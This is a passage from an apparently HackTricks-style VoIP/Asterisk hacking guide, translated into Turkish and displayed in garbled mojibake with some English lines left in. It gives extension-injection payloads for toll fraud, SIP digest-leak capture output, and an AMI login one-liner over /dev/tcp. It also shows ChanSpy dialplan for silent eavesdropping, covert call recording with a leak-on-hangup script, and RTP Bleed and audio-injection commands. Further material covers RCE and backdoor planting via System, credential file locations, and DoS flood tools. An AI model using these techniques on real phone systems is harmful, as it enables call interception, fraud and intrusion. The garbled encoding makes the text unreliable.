Ã–nceki, kullanÄ±cÄ±nÄ±n bir departmanÄ± aramak iÃ§in **1'e basmasÄ±**, baÅŸka birini aramak iÃ§in **2'ye basmasÄ±** veya biliyorsa **tam uzantÄ±yÄ±** girmesi istendiÄŸi bir Ã¶rnektir.\
AÃ§Ä±k, belirtilen **uzantÄ± uzunluÄŸunun kontrol edilmemesi, bir kullanÄ±cÄ±nÄ±n 5 saniyelik zaman aÅŸÄ±mÄ±nda tam bir numara girmesi ve bunun aramasÄ± olabileceÄŸidir.**

### UzantÄ± Enjeksiyonu

AÅŸaÄŸÄ±daki gibi bir uzantÄ± kullanarak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Where **`${EXTEN}`** is the **extension** that will be called, when the **ext 101 is introduced** this is what would happen:  
**`${EXTEN}`** **Ã§aÄŸrÄ±lacak uzantÄ±dÄ±r**, **ext 101 tanÄ±tÄ±ldÄ±ÄŸÄ±nda** bu gerÃ§ekleÅŸecektir:
```scss
exten => 101,1,Dial(SIP/101)
```
Ancak, eÄŸer **`${EXTEN}`** **sayÄ±larÄ±n dÄ±ÅŸÄ±nda daha fazlasÄ±nÄ±** girmeye izin veriyorsa (eski Asterisk sÃ¼rÃ¼mlerinde olduÄŸu gibi), bir saldÄ±rgan **`101&SIP123123123`** girerek 123123123 telefon numarasÄ±nÄ± arayabilir. Ve bu sonuÃ§ olacaktÄ±r:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Bu nedenle, **`101`** ve **`123123123`** uzantÄ±sÄ±na bir Ã§aÄŸrÄ± gÃ¶nderilecek ve yalnÄ±zca ilk Ã§aÄŸrÄ±yÄ± alan baÄŸlantÄ± kurulacaktÄ±r... ancak bir saldÄ±rgan, mevcut olan herhangi bir eÅŸleÅŸmeyi atlayan ancak var olmayan bir **uzantÄ± kullanÄ±rsa**, yalnÄ±zca istenen numaraya **bir Ã§aÄŸrÄ± enjekte edebilir**.

## SIPDigestLeak zafiyeti

SIP Digest Leak, hem donanÄ±m hem de yazÄ±lÄ±m IP TelefonlarÄ± ile telefon adaptÃ¶rlerini (VoIP'tan analog) iÃ§eren Ã§ok sayÄ±da SIP Telefonunu etkileyen bir zafiyettir. Bu zafiyet, ÅŸifreden hesaplanan **Digest kimlik doÄŸrulama yanÄ±tÄ±nÄ±n sÄ±zmasÄ±na** izin verir. **Ã‡evrimdÄ±ÅŸÄ± bir ÅŸifre saldÄ±rÄ±sÄ± mÃ¼mkÃ¼n hale gelir** ve meydan okuma yanÄ±tÄ±na dayanarak Ã§oÄŸu ÅŸifreyi kurtarabilir.

**[Zafiyet senaryosu buradan**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Bir IP Telefon (kurban) herhangi bir portta (Ã¶rneÄŸin: 5060) dinliyor, telefon Ã§aÄŸrÄ±larÄ±nÄ± kabul ediyor
2. SaldÄ±rgan IP Telefone bir INVITE gÃ¶nderiyor
3. Kurban telefon Ã§almaya baÅŸlÄ±yor ve biri aÃ§Ä±p kapatÄ±yor (Ã§Ã¼nkÃ¼ diÄŸer uÃ§ta kimse telefonu aÃ§mÄ±yor)
4. Telefon kapatÄ±ldÄ±ÄŸÄ±nda, **kurban telefon saldÄ±rgana bir BYE gÃ¶nderiyor**
5. **SaldÄ±rgan bir 407 yanÄ±tÄ± veriyor** ve **kimlik doÄŸrulama talep ediyor** ve bir kimlik doÄŸrulama meydan okumasÄ± yayÄ±mlÄ±yor
6. **Kurban telefon, ikinci bir BYE'de kimlik doÄŸrulama meydan okumasÄ±na bir yanÄ±t saÄŸlÄ±yor**
7. **SaldÄ±rgan, yerel makinesinde (veya daÄŸÄ±tÄ±lmÄ±ÅŸ aÄŸ vb.) meydan okuma yanÄ±tÄ±na karÅŸÄ± bir brute-force saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir** ve ÅŸifreyi tahmin edebilir

* **SIPPTS sÄ±zÄ±ntÄ±sÄ±** [**sippts**](https://github.com/Pepelux/sippts)**'den:** SIPPTS sÄ±zÄ±ntÄ±sÄ±, Ã§ok sayÄ±da SIP Telefonunu etkileyen SIP Digest Leak zafiyetini istismar eder. Ã‡Ä±ktÄ±, SIPPTS dcrack veya SipCrack aracÄ± kullanarak brute force yapmak iÃ§in SipCrack formatÄ±nda kaydedilebilir.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call, bir **web kullanÄ±cÄ±sÄ±nÄ±n** (Ã¶rneÄŸin bir Ã¼rÃ¼ne ilgi duyan) **telefon numarasÄ±nÄ±** tanÄ±tmasÄ±na olanak tanÄ±r. ArdÄ±ndan bir ticari arama yapÄ±lÄ±r ve kullanÄ±cÄ± **telefonu aÃ§tÄ±ÄŸÄ±nda**, kullanÄ±cÄ± **ajanla arama yapÄ±lÄ±p baÄŸlanÄ±r**.

Bunun iÃ§in yaygÄ±n bir Asterisk profili ÅŸudur:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Ã–nceki profil **HERHANGÄ° BÄ°R IP adresinin baÄŸlanmasÄ±na** izin veriyor (ÅŸifre biliniyorsa).
* Daha Ã¶nce belirtildiÄŸi gibi, **bir arama dÃ¼zenlemek iÃ§in** **okuma izinlerine gerek yoktur** ve **sadece** **yazma** iÃ§in **baÅŸlatma** gereklidir.

Bu izinlerle, ÅŸifreyi bilen herhangi bir IP baÄŸlanabilir ve Ã§ok fazla bilgi Ã§Ä±karabilir, Ã¶rneÄŸin: 

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Daha fazla bilgi veya iÅŸlem talep edilebilir.**

### **Dinleme**

Asterisk'te, gerÃ§ekleÅŸen konuÅŸmalarÄ± duymak iÃ§in **izlenecek uzantÄ±(lar)** belirterek **`ChanSpy`** komutunu kullanmak mÃ¼mkÃ¼ndÃ¼r. Bu komut bir uzantÄ±ya atanmalÄ±dÄ±r.

Ã–rneÄŸin, **`exten => 333,1,ChanSpy('all',qb)`** ifadesi, eÄŸer **uzantÄ± 333**'Ã¼ **aramak** isterseniz, **tÃ¼m** uzantÄ±larÄ± **izleyeceÄŸini**, yeni bir konuÅŸma baÅŸladÄ±ÄŸÄ±nda (**`b`**) sessiz modda (**`q`**) dinlemeye baÅŸlayacaÄŸÄ±nÄ± belirtir; Ã§Ã¼nkÃ¼ buna mÃ¼dahale etmek istemiyoruz. **`*`** tuÅŸuna basarak veya uzantÄ± numarasÄ±nÄ± tuÅŸlayarak bir konuÅŸmadan diÄŸerine geÃ§ebilirsiniz.

Sadece bir uzantÄ±yÄ± izlemek iÃ§in **`ExtenSpy`** kullanmak da mÃ¼mkÃ¼ndÃ¼r.

KonuÅŸmalarÄ± dinlemek yerine, bir uzantÄ± kullanarak **dosyalara kaydetmek** de mÃ¼mkÃ¼ndÃ¼r: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Aramalar **`/tmp`** dizininde kaydedilecektir.

Asterisk'in kapandÄ±ÄŸÄ±nda **aramayÄ± sÄ±zdÄ±racak bir script Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ±** da saÄŸlayabilirsiniz.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed zafiyeti

**RTCPBleed**, Asterisk tabanlÄ± VoIP sunucularÄ±nÄ± etkileyen bÃ¼yÃ¼k bir gÃ¼venlik sorunudur (2017'de yayÄ±mlandÄ±). Bu zafiyet, VoIP konuÅŸmalarÄ±nÄ± taÅŸÄ±yan **RTP (GerÃ§ek Zaman ProtokolÃ¼) trafiÄŸinin**, **Ä°nternetteki herkes tarafÄ±ndan dinlenip yÃ¶nlendirilebilmesine** olanak tanÄ±r. Bu, RTP trafiÄŸinin NAT (AÄŸ Adresi Ã‡evirisi) gÃ¼venlik duvarlarÄ±ndan geÃ§erken kimlik doÄŸrulamayÄ± atlamasÄ±ndan kaynaklanÄ±r.

RTP proxy'leri, iki veya daha fazla taraf arasÄ±nda RTP akÄ±ÅŸlarÄ±nÄ± proxy'leyerek RTC sistemlerini etkileyen **NAT sÄ±nÄ±rlamalarÄ±nÄ±** gidermeye Ã§alÄ±ÅŸÄ±r. NAT mevcut olduÄŸunda, RTP proxy yazÄ±lÄ±mÄ± genellikle sinyalizasyon (Ã¶rneÄŸin, SIP) aracÄ±lÄ±ÄŸÄ±yla elde edilen RTP IP ve port bilgilerine gÃ¼venemez. Bu nedenle, bazÄ± RTP proxy'leri, bÃ¶yle bir **IP ve port Ã§iftinin otomatik olarak Ã¶ÄŸrenildiÄŸi** bir mekanizma uygulamÄ±ÅŸtÄ±r. Bu genellikle gelen RTP trafiÄŸini inceleyerek ve gelen RTP trafiÄŸi iÃ§in kaynak IP ve portunu yanÄ±tlanmasÄ± gereken olarak iÅŸaretleyerek yapÄ±lÄ±r. "Ã–ÄŸrenme modu" olarak adlandÄ±rÄ±labilecek bu mekanizma, **herhangi bir tÃ¼r kimlik doÄŸrulama kullanmaz**. Bu nedenle, **saldÄ±rganlar**, **RTP proxy'sine RTP trafiÄŸi gÃ¶nderebilir** ve devam eden bir RTP akÄ±ÅŸÄ± iÃ§in arayan veya aranan kiÅŸi iÃ§in gÃ¶nderilmesi gereken proxy'lenmiÅŸ RTP trafiÄŸini alabilir. Bu zafiyete RTP Bleed diyoruz Ã§Ã¼nkÃ¼ saldÄ±rganlarÄ±n meÅŸru kullanÄ±cÄ±lara gÃ¶nderilmesi gereken RTP medya akÄ±ÅŸlarÄ±nÄ± almasÄ±na olanak tanÄ±r.

RTP proxy'lerinin ve RTP yÄ±ÄŸÄ±nlarÄ±nÄ±n bir diÄŸer ilginÃ§ davranÄ±ÅŸÄ±, bazen **RTP Bleed'e karÅŸÄ± savunmasÄ±z olsalar bile**, **herhangi bir kaynaktan RTP paketlerini kabul edip iletebilmeleri**dir. Bu nedenle, saldÄ±rganlar meÅŸru olanÄ±n yerine kendi medyalarÄ±nÄ± enjekte etmelerine olanak tanÄ±yan RTP paketleri gÃ¶nderebilir. Bu saldÄ±rÄ±ya RTP enjeksiyonu diyoruz Ã§Ã¼nkÃ¼ mevcut RTP akÄ±ÅŸlarÄ±na meÅŸru olmayan RTP paketlerinin enjekte edilmesine olanak tanÄ±r. Bu zafiyet hem RTP proxy'lerinde hem de uÃ§ noktalarÄ±nda bulunabilir.

Asterisk ve FreePBX geleneksel olarak **`NAT=yes` ayarÄ±nÄ±** kullanmÄ±ÅŸtÄ±r, bu da RTP trafiÄŸinin kimlik doÄŸrulamayÄ± atlamasÄ±na olanak tanÄ±r ve bu da aramalarda sesin olmamasÄ±na veya tek yÃ¶nlÃ¼ ses sorununa yol aÃ§abilir.

Daha fazla bilgi iÃ§in [https://www.rtpbleed.com/](https://www.rtpbleed.com/) adresini kontrol edin.

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed, RTP akÄ±ÅŸlarÄ± gÃ¶ndererek RTP Bleed zafiyetini tespit eder.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed, RTCP akÄ±ÅŸlarÄ± gÃ¶ndererek RTP Bleed zafiyetini tespit eder.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood, RTP akÄ±ÅŸlarÄ± gÃ¶ndererek RTP Bleed aÃ§Ä±ÄŸÄ±nÄ± istismar eder.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject, bir ses dosyasÄ±nÄ± (WAV formatÄ±nda) enjekte ederek RTP Bleed aÃ§Ä±ÄŸÄ±nÄ± istismar eder.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asterisk'te bir ÅŸekilde **uzantÄ± kurallarÄ± ekleyip bunlarÄ± yeniden yÃ¼kleyebilme** (Ã¶rneÄŸin, savunmasÄ±z bir web yÃ¶netim sunucusunu ele geÃ§irerek) yeteneÄŸine sahip olduÄŸunuzda, **`System`** komutunu kullanarak RCE elde etmek mÃ¼mkÃ¼ndÃ¼r.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
EÄŸer sunucu **`System`** komutunda belirli karakterlerin kullanÄ±lmasÄ±na **izin vermiyorsa** (Elastix'te olduÄŸu gibi), web sunucusunun **sistemde dosya oluÅŸturmasÄ±na izin verip vermediÄŸini** kontrol edin (Elastix veya trixbox'ta olduÄŸu gibi) ve bunu **bir arka kapÄ± scripti oluÅŸturmak iÃ§in** kullanÄ±n, ardÄ±ndan **`System`** ile bu **scripti Ã§alÄ±ÅŸtÄ±rÄ±n**.
{% endhint %}

#### Ä°lginÃ§ yerel dosyalar ve izinler

* **`sip.conf`** -> SIP kullanÄ±cÄ±larÄ±nÄ±n ÅŸifresini iÃ§erir.
* EÄŸer **Asterisk sunucusu root olarak Ã§alÄ±ÅŸÄ±yorsa**, root'u tehlikeye atabilirsiniz.
* **mysql root kullanÄ±cÄ±sÄ±nÄ±n** **herhangi bir ÅŸifresi olmayabilir**.
* bu, bir arka kapÄ± olarak yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`FreePBX`**
* **`amportal.conf`** -> Web paneli yÃ¶neticisinin ÅŸifresini iÃ§erir (FreePBX).
* **`FreePBX.conf`** -> VeritabanÄ±na eriÅŸmek iÃ§in kullanÄ±lan FreePBXuser kullanÄ±cÄ±sÄ±nÄ±n ÅŸifresini iÃ§erir.
* bu, bir arka kapÄ± olarak yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root ÅŸifresi, IMAPd ÅŸifresi, web admin ÅŸifresi gibi dÃ¼z metin olarak birkaÃ§ ÅŸifre iÃ§erir.
* **BirÃ§ok klasÃ¶r**, tehlikeye atÄ±lmÄ±ÅŸ asterisk kullanÄ±cÄ±sÄ±na ait olacaktÄ±r (root olarak Ã§alÄ±ÅŸmÄ±yorsa). Bu kullanÄ±cÄ± Ã¶nceki dosyalarÄ± okuyabilir ve ayrÄ±ca yapÄ±landÄ±rmayÄ± kontrol edebilir, bÃ¶ylece Asterisk'in Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda diÄŸer arka kapÄ±lÄ± ikili dosyalarÄ± yÃ¼klemesini saÄŸlayabilir.

### RTP Enjeksiyonu

**`.wav`** dosyasÄ±nÄ± **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ve **`rtpmixsound`** (`sudo apt install rtpmixsound`) gibi araÃ§lar kullanarak konuÅŸmalara eklemek mÃ¼mkÃ¼ndÃ¼r.

Ya da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) adresindeki scriptleri kullanarak **konuÅŸmalarÄ± tarayabilir** (**`rtpscan.pl`**), bir konuÅŸmaya **`.wav`** gÃ¶nderebilir (**`rtpsend.pl`**) ve bir konuÅŸmaya **gÃ¼rÃ¼ltÃ¼ ekleyebilirsiniz** (**`rtpflood.pl`**).

### DoS

VoIP sunucularÄ±nda DoS elde etmenin birkaÃ§ yolu vardÄ±r.

* **`SIPPTS flood`** [**sippts**](https://github.com/Pepelux/sippts)**'den**: SIPPTS flood, hedefe sÄ±nÄ±rsÄ±z mesaj gÃ¶nderir.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** [**sippts**](https://github.com/Pepelux/sippts)**'den**: SIPPTS ping, sunucunun yanÄ±t sÃ¼resini gÃ¶rmek iÃ§in bir SIP ping yapar.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk tarafÄ±ndan kullanÄ±lan DoS IAX protokolÃ¼.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP Ã¼zerinden SIP/SDP INVITE mesajÄ± seli gerÃ§ekleÅŸtiren bir araÃ§.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): BirÃ§ok dÃ¼zgÃ¼n biÃ§imlendirilmiÅŸ RTP paketi gÃ¶nderir. KullanÄ±lan RTP portlarÄ±nÄ± bilmek gerekir (Ã¶nce sniff yapÄ±n).
* [**SIPp**](https://github.com/SIPp/sipp): SIP trafiÄŸini analiz etme ve oluÅŸturma imkanÄ± saÄŸlar, bu nedenle DoS iÃ§in de kullanÄ±labilir.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Ã§ok amaÃ§lÄ± alet. SIP saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in de kullanÄ±labilir.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS GÃ¼venlik AÃ§Ä±klarÄ±

Asterisk gibi bir yazÄ±lÄ±mÄ± kurmanÄ±n en kolay yolu, zaten kurulu olan bir **OS daÄŸÄ±tÄ±mÄ±nÄ±** indirmektir, Ã¶rneÄŸin: **FreePBX, Elastix, Trixbox**... Bu daÄŸÄ±tÄ±mlarÄ±n sorunu, Ã§alÄ±ÅŸmaya baÅŸladÄ±ktan sonra sistem yÃ¶neticilerinin **bir daha gÃ¼ncellemeyebileceÄŸi** ve **gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n** zamanla keÅŸfedileceÄŸidir.

## Referanslar

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
